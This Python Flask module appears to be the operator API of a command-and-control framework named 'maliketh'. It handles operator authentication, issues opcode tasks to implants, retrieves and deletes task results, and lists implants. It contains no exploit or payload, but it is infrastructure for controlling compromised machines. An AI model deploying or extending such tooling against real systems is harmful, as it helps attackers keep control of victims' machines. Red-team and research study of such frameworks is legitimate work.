from datetime import datetime, timedelta
from typing import Any
from flask import Blueprint, jsonify, request
from maliketh.db import db
from maliketh.models import *
from maliketh.crypto.ec import *
from maliketh.crypto.utils import random_hex, random_string
from maliketh.config import ROUTES
from functools import wraps

admin = Blueprint("admin", __name__, url_prefix=ROUTES["operator"]["base_path"])


def verify_auth_token(request) -> Optional[str]:
    """
    Given a request, verify its Authentication header

    :param request: The request to verify
    :return The operator username if the token is valid, otherwise None
    """
    # Get bearer token
    token = request.headers.get("Authorization", None)
    if token is None:
        return None

    # Check if it's a bearer token
    if not token.startswith("Bearer "):
        return None

    # Get the token
    token = token[7:]

    # Get the operator
    operator = Operator.query.filter_by(auth_token=token).first()
    if operator is None:
        return None

    # Check if the token is still valid
    token_exp = datetime.strptime(operator.auth_token_expiry, "%Y-%m-%d %H:%M:%S")
    if token_exp < datetime.now():
        return None

    return operator


def verified(func):
    """
    Decorator to check if the request is authenticated
    :param func: The function to decorate
    :return The decorated function with the operator as a keyword argument
    """

    @wraps(func)
    def wrapper(*args, **kwargs):
        # Check if the request is authenticated
        operator = verify_auth_token(request)
        if operator is None:
            return jsonify({"status": False, "msg": "Not authenticated"}), 401
        kwargs = {**kwargs, "operator": operator}
        return func(*args, **kwargs)

    return wrapper


@admin.route(
    ROUTES["operator"]["stats"]["path"],
    methods=ROUTES["operator"]["stats"]["methods"],
)
@verified
def server_stats(operator: Operator) -> Any:
    """
    Get basic statistics about the server
    """
    # Get number of implants, number of active tasks, total number of tasks
    # number of operators
    num_implants = Implant.query.count()
    num_active_tasks = Task.query.filter_by(
        operator_name=operator.username, status="active"
    ).count()
    num_total_tasks = Task.query.filter_by(operator_name=operator.username).count()
    num_operators = Operator.query.count()

    return jsonify(
        {
            "status": True,
            "implants": num_implants,
            "active_tasks": num_active_tasks,
            "total_tasks": num_total_tasks,
            "operators": num_operators,
        }
    )

# @admin.route("/op/auth/token/request", methods=["GET"])  # type: ignore
@admin.route(
    ROUTES["operator"]["request_auth_token"]["path"],
    methods=ROUTES["operator"]["request_auth_token"]["methods"],
)
def request_token() -> Any:
    # Check if X-ID and X-Signature header is present
    if any(x not in request.headers for x in ["X-ID", "X-Signature"]):
        return jsonify({"status": False, "message": "Unknown operator key"}), 400

    # Check if they have content
    if any(len(request.headers[x]) == 0 for x in ["X-ID", "X-Signature"]):
        return jsonify({"status": False, "message": "Unknown operator key"}), 400

    # X-Signature is in format base64(enc_and_sign(pub_key, operator_signing_key, server_pub_key))
    # So we need to decrypt it with the server public key,
    # Then verify the signature with the operator signing key

    # Get the operator from X-ID
    operator = Operator.query.filter_by(username=request.headers["X-ID"]).first()
    if operator is None:
        return jsonify({"status": False, "message": "Unknown operator"}), 400

    original_message = decrypt_and_verify(
        bytes(request.headers["X-Signature"], "utf-8"), operator
    )

    if original_message is None:
        return jsonify({"status": False, "msg": "Couldn't verify signature"}), 400

    original_message = original_message.decode("utf-8")

    if original_message != operator.login_secret:
        return (
            jsonify(
                {
                    "status": False,
                    "msg": "Unable to verify signature",
                }
            ),
            400,
        )

    # If we get here, the operator is authenticated

    # Check if the token is still valid

    if (
        operator.auth_token_expiry is not None
        and datetime.strptime(operator.auth_token_expiry, "%Y-%m-%d %H:%M:%S")
        > datetime.now()
    ):
        token = operator.auth_token
    else:
        # Generate a new token
        token = random_hex(128)
        operator.auth_token = token
        operator.auth_token_expiry = (datetime.now() + timedelta(hours=6)).strftime(
            "%Y-%m-%d %H:%M:%S"
        )
        db.session.commit()

    # TODO rabbitmq stuff

    return (
        jsonify(
            {
                "status": True,
                "token": token,
                "rmq_queue": "",
                "rmq_host": "",
                "rmq_port": 1,
            }
        ),
        200,
    )


# @admin.route("/op/auth/token/revoke", methods=["GET"])  # type: ignore
@admin.route(
    ROUTES["operator"]["revoke_auth_token"]["path"],
    methods=ROUTES["operator"]["revoke_auth_token"]["methods"],
)
@verified
def revoke_token(operator: Operator) -> Any:
    operator.auth_token = None  # type: ignore
    operator.auth_token_expiry = None  # type: ignore
    db.session.commit()
    return jsonify({"status": True}), 200

@admin.route(
    ROUTES["operator"]["auth_token_status"]["path"],
    methods=ROUTES["operator"]["auth_token_status"]["methods"],
)
def token_status() -> Any:
    operator = verify_auth_token(request)
    if operator is None:
        return jsonify({"status": False, "msg": "Not authenticated"}), 401
    return jsonify({"status": True, "msg": "Authenticated"}), 200

# @admin.route("/op/tasks/list", methods=["GET"])  # type: ignore
@admin.route(
    ROUTES["operator"]["list_tasks"]["path"],
    methods=ROUTES["operator"]["list_tasks"]["methods"],
)
@verified
def list_tasks(operator: Operator) -> Any:
    """
    Get a list of tasks issued by this operator
    """
    tasks = Task.query.filter_by(operator_name=operator.username).all()
    return jsonify({"status": True, "tasks": [x.toJSON() for x in tasks]}), 200


# @admin.route("/op/tasks/add", methods=["POST"])  # type: ignore
@admin.route(
    ROUTES["operator"]["add_task"]["path"],
    methods=ROUTES["operator"]["add_task"]["methods"],
)
@verified
def add_task(operator: Operator) -> Any:
    """
    Add a new task
    """

    if request.json is None:
        return jsonify({"status": False, "msg": "Invalid request, no JSON body"}), 400

    # Get the task
    task = request.json

    required_fields = ["implant_id", "opcode", "args"]

    # Check if the task is valid
    if any(x not in task for x in required_fields):
        return (
            jsonify(
                {
                    "status": False,
                    "msg": f"Invalid task, missing fields: {', '.join(required_fields - task.keys())}",
                }
            ),
            400,
        )

    # Create the task
    task = Task.new_task(
        operator.username,
        task["implant_id"],
        task["opcode"],
        task["args"],
    )

    return jsonify({"status": True, "task": task.toJSON()}), 200


# @admin.route("/op/tasks/result/<task_id>", methods=["GET"])  # type: ignore
@admin.route(
    ROUTES["operator"]["task_results"]["path"],
    methods=ROUTES["operator"]["task_results"]["methods"],
)
@verified
def get_task_result(operator: Operator, task_id: str) -> Any:
    """
    Get the result of a task
    """
    # Check if this operator owns the task
    task = Task.query.filter_by(task_id=task_id).first()
    if task is None:
        return jsonify({"status": False, "msg": "Unknown task"}), 400

    if task.operator_name != operator.username:
        return jsonify({"status": False, "msg": "Unauthorized"}), 401

    return jsonify({"status": True, "result": task.output}), 200


#@admin.route("/op/tasks/delete/<task_id>", methods=["DELETE"])  # type: ignore
@admin.route(ROUTES["operator"]["delete_task"]["path"], methods=ROUTES["operator"]["delete_task"]["methods"])
@verified
def delete_task(operator: Operator, task_id: str) -> Any:
    """
    Delete a task
    """
    # Check if this operator owns the task
    task = Task.query.filter_by(task_id=task_id).first()
    if task is None:
        return jsonify({"status": False, "msg": "Unknown task"}), 400

    if task.operator_name != operator.username:
        return jsonify({"status": False, "msg": "Unauthorized"}), 401

    db.session.delete(task)
    db.session.commit()

    return jsonify({"status": True}), 200


@admin.route(ROUTES["operator"]["list_implants"]["path"], methods=ROUTES["operator"]["list_implants"]["methods"])
@verified
def list_implants(operator: Operator) -> Any:
    """
    Get a list of all implants
    """
    implants = Implant.query.all()
    return jsonify({"status": True, "implants": [x.toJSON() for x in implants]}), 200

